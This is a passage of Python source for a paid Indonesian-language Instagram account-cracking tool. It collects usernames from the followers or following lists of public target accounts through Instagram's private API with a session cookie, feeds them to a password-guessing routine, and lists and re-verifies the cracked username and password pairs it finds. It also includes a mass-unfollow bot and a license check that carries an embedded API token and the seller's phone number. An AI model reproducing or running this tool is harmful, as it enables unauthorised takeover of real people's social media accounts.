            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f' {H}[PILIH] :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            mas='# Masukan jumlah target'
            mas1=mark(mas,style='dark_orange ')
            sol().print(mas1)
            m=int(input(f'\n{CY}[•] Jumlah : {C}'));print('')
            mas='# Masukan nama random untuk di searching'
            mas1=mark(mas,style='dark_orange ')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}[>] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='dark_orange')
            cetak(nel(po, title='NOTE'))
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('JANGAN KOSONG!')


        elif c in ('3','03'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='dark_orange')
            cetak(nel(po, title='NOTE'))
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('JANGAN KOSONG!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{CY}[+] Total Result {H} {len(g)}{C}')
            print(f'\n{CY}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}[#] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
  ├──[ HASIL {M}CHECKPOINT ]
  ├──[{K}CP{C}] Username  :{K} {usr}{C}
  ├──[{K}CP{C}] Password  :{K} {pwd}{C}
  ├──[{K}CP{C}] Followers :{K} {fol}{C}
  ├──[{K}CP{C}] Following :{K} {ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  ├──[ HASIL {H}OK ]
  ├──[{H}OK{C}] Username  :{H} {usr}{C}
  ├──[{H}OK{C}] Password  :{H} {pwd}{C}
  ├──[{H}OK{C}] Pengikut  :{H} {fol}{C}
  ├──[{H}OK{C}] Mengikuti :{H} {ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('r','R'):
            self.BUG()
        elif c in ('c','C'):
            self.ChangeLog()
        elif c in ('e','E'):
            self.Exit()

        else:
            self.menu()
def tlisensi():
    banner()
    nt='[bright_white][+] This Tool Paid\n[+] WhatsApp me if you want to buy a license\n[+] +6287752662364\n[+] You shall not misuse the information to gain unauthorised access.\n[+] I will not be Responsible for Anything, Use at Your Own Risk..⚠️\n[+] Use it properly..⚠️\n'
    nt2 =nel(nt, style='dark_orange  ')
    cetak(nel(nt2, title='NOTE⚠️'))
    time.sleep(1)
    lisen=input('[•] Masukankan License: ')
    open('.lisen.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyNDQ4MTA1MyIsIkNkaFIvWHRpQ0ptQUJzeTNPcm40OHllQUptUW9GZiszS0FJejBUVjgiXQ==&ProductId=16568&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LISENSI BENAR '
        wel2 = mark(wel, style='dark_orange')
        sol().print(wel2)
        time.sleep(1)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
    try:
        menudump.append('mengikuti')
        mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
        mas1 = mark(mas, style='dark_orange')
        sol().print(mas1)
        m = int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
    except:
        m = 1
    for t in range(m):
        t += 1
        so = f'# TOTAL ID :{len(internal)}'
        pi = mark(so, style='dark_orange')
        sol().print(pi)
        nama = input(f' [{t}] Masukan Username : ')
        id = self.idAPI(self.cookie, nama)
        info = self.infoAPI(
            self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
    self.passwordAPI(info)


def meng(self):
	try:
		menudump.append('mengikuti')
		mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
		mas1 = mark(mas, style='dark_orange')
		sol().print(mas1)
		m = input(f'{H}[•] MASUKKAN USERNAME TARGET : {C}')	
		id = self.idAPI(self.cookie, m)
		info = self.ifoAPI(self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
		self.passwordAPI(info)
	except Exception as e:
		exit('GAGAL')

def masal(self):
            try:
                menudump.append('pengikut')
                mas='#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
                mas1=mark(mas,style='dark_orange')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃 :{len(internal)}'
                pi=mark(so,style='dark_orange')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            mas='# TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
            mas1=mark(mas,style='dark_orange')
            sol().print(mas1)
            m=input(f'{H}[•] MASUKKAN USERNAME TARGET : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)
            
#--------------------[ SISTEM-CONTROL ]-------------------------#

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
